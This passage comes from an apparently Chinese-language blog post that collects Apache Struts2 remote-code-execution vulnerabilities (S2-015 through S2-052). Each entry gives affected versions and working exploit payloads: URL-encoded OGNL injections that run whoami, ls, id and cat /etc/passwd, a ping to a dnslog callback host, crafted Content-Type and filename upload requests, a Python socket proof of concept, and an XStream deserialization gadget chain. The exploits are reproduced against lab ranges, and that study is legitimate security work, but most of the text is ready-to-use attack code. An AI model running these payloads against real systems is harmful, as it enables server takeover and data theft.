<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/link.action?a=%24%7B%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(&#x27;whoami&#x27;).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B50000%5D%2C%23c.read(%23d)%2C%23out%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23out.println(&#x27;dbapp%3D&#x27;%2Bnew%20java.lang.String(%23d))%2C%23out.close()%7D</span><br></pre></td></tr></table></figure>

<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309163701251.png" class title="image-20220309163701251">

<p><strong>命令执行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.211.129:8080/link.action?a=%24%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22ping%20test.l2plmu.dnslog.cn%22%29%29%7D</span><br></pre></td></tr></table></figure>

<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309163936553.png" class title="image-20220309163936553">

<h3 id="S2-015"><a href="#S2-015" class="headerlink" title="S2-015"></a>S2-015</h3><h4 id="漏洞简介-7"><a href="#漏洞简介-7" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;S2-015&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;*&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.action.PageAction&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span>&gt;</span>/&#123;1&#125;.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 &#x2F; “ \ 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。</p>
<p>还有需要说明的就是在 Struts 2.3.14.1 - Struts 2.3.14.2 的更新内容中，删除了 SecurityMemberAccess 类中的  setAllowStaticMethodAccess 方法，因此在 2.3.14.2 版本以后都不能直接通过 <code>#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true</code> 来修改其值达到重获静态方法调用的能力。</p>
<p>这里为了到达执行命令的目的可以用 kxlzx 提到的调用动态方法 (new java.lang.ProcessBuilder(‘calc’)).start() 来解决，另外还可以借助 Java 反射机制去间接修改：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#context[&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;]=false,#m=#_memberAccess.getClass().getDeclaredField(&#x27;allowStaticMethodAccess&#x27;),#m.setAccessible(true),#m.set(#_memberAccess,true)</span><br></pre></td></tr></table></figure>

<h4 id="漏洞版本-6"><a href="#漏洞版本-6" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 - 2.3.14.2</p>
<h4 id="漏洞探测-7"><a href="#漏洞探测-7" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p><strong>获取id</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ls%27%29.getInputStream%28%29%29%2C%23q%7D.action</span><br></pre></td></tr></table></figure>

<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309164631462.png" class title="image-20220309164631462">

<h4 id="漏洞利用-7"><a href="#漏洞利用-7" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>查看系统文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20%2Fetc%2Fpasswd%27%29.getInputStream%28%29%29%2C%23q%7D.action</span><br></pre></td></tr></table></figure>

<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309164936562.png" class title="image-20220309164936562">



<h3 id="S2-016"><a href="#S2-016" class="headerlink" title="S2-016"></a>S2-016</h3><p>vulhub搭建环境失败，使用墨者学院进行复现</p>
<p>靶场地址:</p>
<p><a href="https://www.mozhe.cn/bug/detail/MkhJb2Jpblh4MkYrMjkrNC84UjZtUT09bW96aGUmozhe">Apache Struts2远程代码执行漏洞(S2-016)复现_命令执行_在线靶场_墨者学院_专注于网络安全人才培养 (mozhe.cn)</a></p>
<h4 id="漏洞简介-8"><a href="#漏洞简介-8" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Struts2的action:、redirect:和redirectAction:前缀参数在实现其功能的过程中使用了Ognl表达式，并将用户通过URL提交的内容拼接入Ognl表达式中，从而造成攻击者可以通过构造恶意URL来执行任意Java代码，进而可执行任意命令。redirect:和redirectAction:此两项前缀为Struts默认开启功能。</p>
<p>在struts2中，DefaultActionMapper类支持以”action:”、“redirect:”、”redirectAction:”作为导航或是重定向前缀，但是这些前缀后面同时可以跟OGNL表达式，由于struts2没有对这些前缀做过滤，导致利用OGNL表达式调用java静态方法执行任意系统命令</p>
<h4 id="漏洞版本-7"><a href="#漏洞版本-7" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 - 2.3.15</p>
<h4 id="漏洞探测-8"><a href="#漏洞探测-8" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>访问ip:port&#x2F;index.action?redirect:%25%7b%33%2a%34%7d，执行表达式</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310152313906.png" class title="image-20220310152313906">

<h4 id="漏洞利用-8"><a href="#漏洞利用-8" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>任意命令执行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&#x27;ls&#x27;,&#x27;/&#x27;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>

<p>将其进行URL编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%24%7b%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%7b%27%6c%73%27%2c%27%2f%27%7d%29%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%6d%61%74%74%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%23%65%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d</span><br></pre></td></tr></table></figure>



<p>执行后下载文件</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310152608959.png" class title="image-20220310152608959">



<p>文件内容为执行的命令ls，列举出所有文件及文件夹</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310152631918.png" class title="image-20220310152631918">



<p>看到存在key.txt文件，下面就是下载key.txt文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&#x27;cat&#x27;,&#x27;key.txt&#x27;&#125;)).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>

<p>使用url编码处理该poc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%24%7b%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%5b%5d%7b%27%63%61%74%27%2c%27%6b%65%79%2e%74%78%74%27%7d%29%29%2e%73%74%61%72%74%28%29%2c%23%62%3d%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65%3d%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%6d%61%74%74%3d%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%23%65%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6d%61%74%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29%7d</span><br></pre></td></tr></table></figure>

<p>得到key</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310153802154.png" class title="image-20220310153802154">

<h3 id="S2-032"><a href="#S2-032" class="headerlink" title="S2-032"></a>S2-032</h3><h4 id="漏洞简介-9"><a href="#漏洞简介-9" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Struts2在开启了动态方法调用（Dynamic Method Invocation）的情况下，可以使用<code>method:&lt;name&gt;</code>的方式来调用名字是<code>&lt;name&gt;</code>的方法，而这个方法名将会进行OGNL表达式计算，导致远程命令执行漏洞。</p>
<h4 id="漏洞版本-8"><a href="#漏洞版本-8" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.3.20 -  2.3.28 (except 2.3.20.3 and 2.3.24.3)</p>
<h4 id="漏洞探测-9"><a href="#漏洞探测-9" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://your-ip:8080/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=id</span><br></pre></td></tr></table></figure>

<p><strong>获取id值</strong></p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309200932329.png" class title="image-20220309200932329">



<h4 id="漏洞利用-9"><a href="#漏洞利用-9" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>查看系统文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://ip:port/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=cat%20%2fetc%2fpasswd</span><br></pre></td></tr></table></figure>

<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309201419829.png" class title="image-20220309201419829">

<h3 id="S2-045"><a href="#S2-045" class="headerlink" title="S2-045"></a>S2-045</h3><h4 id="漏洞简介-10"><a href="#漏洞简介-10" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>在文件上传页面，对请求体中Content-Type中插入payload可执行OGNL表达式</p>
<h4 id="漏洞版本-9"><a href="#漏洞版本-9" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.3.5 -  2.3.31</p>
<p>2.5 -  2.5.10</p>
<h4 id="漏洞探测-10"><a href="#漏洞探测-10" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /doUpload.action HTTP/1.1</span><br><span class="line">Host: 192.168.211.129:8080</span><br><span class="line">Content-Length: 1163048</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.211.129:8080</span><br><span class="line">Content-Type: %&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;vulhub&#x27;,233*233)&#125;.multipart/form-data</span><br><span class="line">boundary=----WebKitFormBoundarywVbGGxxB239G926l</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.211.129:8080/doUpload.action</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=1ncvxy8v5x14j5tjyb6mbfexh</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>OCNL表达式成功执行</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309210227571.png" class title="image-20220309210227571">





<h4 id="漏洞利用-10"><a href="#漏洞利用-10" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>计算表达式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /doUpload.action HTTP/1.1</span><br><span class="line">Host: 192.168.211.129:8080</span><br><span class="line">Content-Length: 1163048</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.211.129:8080</span><br><span class="line">Content-Type: %&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;vulhub&#x27;,12345*12345)&#125;.multipart/form-data</span><br><span class="line">boundary=----WebKitFormBoundarywVbGGxxB239G926l</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.211.129:8080/doUpload.action</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=1ncvxy8v5x14j5tjyb6mbfexh</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220309210540452.png" class title="image-20220309210540452">

<h3 id="S2-046"><a href="#S2-046" class="headerlink" title="S2-046"></a>S2-046</h3><h4 id="漏洞简介-11"><a href="#漏洞简介-11" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>与s2-045类似，但是输入点在文件上传的filename值位置，并需要使用<code>\x00</code>截断。</p>
<h4 id="漏洞版本-10"><a href="#漏洞版本-10" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.3.5 -  2.3.31</p>
<p> 2.5 -  2.5.10</p>
<h4 id="漏洞探测-11"><a href="#漏洞探测-11" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;X-Test&#x27;,233*233)&#125;\x00b&quot;</span><br></pre></td></tr></table></figure>

<p>直接使用burp拦截修改filename未成功，下面使用poc进行探测</p>
<p><strong>poc</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">q = <span class="string">b&#x27;&#x27;&#x27;------WebKitFormBoundaryXd004BVJN9pBYBL2</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;%&#123;#context[&#x27;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#x27;].addHeader(&#x27;X-Test&#x27;,233*233)&#125;\x00b&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">foo</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryXd004BVJN9pBYBL2--&#x27;&#x27;&#x27;</span>.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\r\n&#x27;</span>)</span><br><span class="line">p = <span class="string">b&#x27;&#x27;&#x27;POST / HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:8080</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="string">Accept-Language: en-US,en;q=0.8,es;q=0.6</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2</span></span><br><span class="line"><span class="string">Content-Length: %d</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.replace(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;\r\n&#x27;</span>) % (<span class="built_in">len</span>(q), )</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> socket.create_connection((<span class="string">&#x27;your-ip&#x27;</span>, <span class="string">&#x27;8080&#x27;</span>), timeout=<span class="number">5</span>) <span class="keyword">as</span> conn:</span><br><span class="line">    conn.send(p + q)</span><br><span class="line">    <span class="built_in">print</span>(conn.recv(<span class="number">10240</span>).decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>响应包中可以看到添加的表达式</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310100219241.png" class title="image-20220310100219241">

<h4 id="漏洞利用-11"><a href="#漏洞利用-11" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>可修改poc中表达式进行命令执行</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310100505156.png" class title="image-20220310100505156">



<h3 id="S2-048"><a href="#S2-048" class="headerlink" title="S2-048"></a>S2-048</h3><h4 id="漏洞简介-12"><a href="#漏洞简介-12" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>触发OGNL表达式的位置是<code>Gangster Name</code>这个表单。访问<code>http://your-ip:8080/showcase/</code>即可查看到struts2的测试页面。访问Integration&#x2F;Struts 1 Integration</p>
<h4 id="漏洞版本-11"><a href="#漏洞版本-11" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.0.0 - 2.3.32</p>
<h4 id="漏洞探测-12"><a href="#漏洞探测-12" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>在<code>Gangster Name</code>这个表单中输入<code>$&#123;233*233&#125;</code>即可查看执行结果（剩下两个表单随意填写）</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310102426960.png" class title="image-20220310102426960">

<p>表达式执行成功</p>
<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310102547071.png" class title="image-20220310102547071">

<h4 id="漏洞利用-12"><a href="#漏洞利用-12" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><strong>任意命令执行</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;id&#x27;).getInputStream())).(#q)&#125;</span><br></pre></td></tr></table></figure>



<img src="/2022/03/05/Structs2%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20220310102720073.png" class title="image-20220310102720073">



<h3 id="S2-052"><a href="#S2-052" class="headerlink" title="S2-052"></a>S2-052</h3><h4 id="漏洞简介-13"><a href="#漏洞简介-13" class="headerlink" title="漏洞简介"></a>漏洞简介</h4><p>Struts2-Rest-Plugin是让Struts2能够实现Restful API的一个插件，其根据Content-Type或URI扩展名来判断用户传入的数据包类型，有如下映射表：</p>
<table>
<thead>
<tr>
<th>扩展名</th>
<th>Content-Type</th>
<th>解析方法</th>
</tr>
</thead>
<tbody><tr>
<td>xml</td>
<td>application&#x2F;xml</td>
<td>xstream</td>
</tr>
<tr>
<td>json</td>
<td>application&#x2F;json</td>
<td>jsonlib或jackson(可选)</td>
</tr>
<tr>
<td>xhtml</td>
<td>application&#x2F;xhtml+xml</td>
<td>无</td>
</tr>
<tr>
<td>无</td>
<td>application&#x2F;x-www-form-urlencoded</td>
<td>无</td>
</tr>
<tr>
<td>无</td>
<td>multipart&#x2F;form-data</td>
<td>无</td>
</tr>
</tbody></table>
<p>jsonlib无法引入任意对象，而xstream在默认情况下是可以引入任意对象的（针对1.5.x以前的版本），方法就是直接通过xml的tag name指定需要实例化的类名：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;classname&gt;&lt;/classname&gt;</span><br><span class="line">//或者</span><br><span class="line">&lt;paramname class=&quot;classname&quot;&gt;&lt;/paramname&gt;</span><br></pre></td></tr></table></figure>

<p>所以，我们可以通过反序列化引入任意类造成远程命令执行漏洞，只需要找到一个在Struts2库中适用的gedget。</p>
<h4 id="漏洞版本-12"><a href="#漏洞版本-12" class="headerlink" title="漏洞版本"></a>漏洞版本</h4><p>2.1.2 -  2.3.33,</p>
<p>2.5 -  2.5.12</p>
<h4 id="漏洞探测-13"><a href="#漏洞探测-13" class="headerlink" title="漏洞探测"></a>漏洞探测</h4><p>启动环境后，访问<code>http://your-ip:8080/orders.xhtml</code>即可看到showcase页面。由于rest-plugin会根据URI扩展名或Content-Type来判断解析方法，所以我们只需要修改orders.xhtml为orders.xml或修改Content-Type头为application&#x2F;xml，即可在Body中传递XML数据。</p>
<p>所以，最后发送的数据包为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /orders/3/edit HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 2415</span><br><span class="line"></span><br><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</span><br><span class="line">      &lt;flags&gt;0&lt;/flags&gt;</span><br><span class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span><br><span class="line">        &lt;dataHandler&gt;</span><br><span class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span><br><span class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span><br><span class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span><br><span class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</span><br><span class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</span><br><span class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span><br><span class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span><br><span class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">                      &lt;command&gt;</span><br><span class="line">                        &lt;string&gt;touch&lt;/string&gt;</span><br><span class="line">                        &lt;string&gt;/tmp/success&lt;/string&gt;</span><br><span class="line">                      &lt;/command&gt;</span><br><span class="line">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span><br><span class="line">                    &lt;/next&gt;</span><br><span class="line">                  &lt;/iter&gt;</span><br><span class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span><br><span class="line">                    &lt;method&gt;</span><br><span class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span><br><span class="line">                      &lt;name&gt;start&lt;/name&gt;</span><br><span class="line">                      &lt;parameter-types/&gt;</span><br><span class="line">                    &lt;/method&gt;</span><br><span class="line">                    &lt;name&gt;foo&lt;/name&gt;</span><br><span class="line">                  &lt;/filter&gt;</span><br><span class="line">                  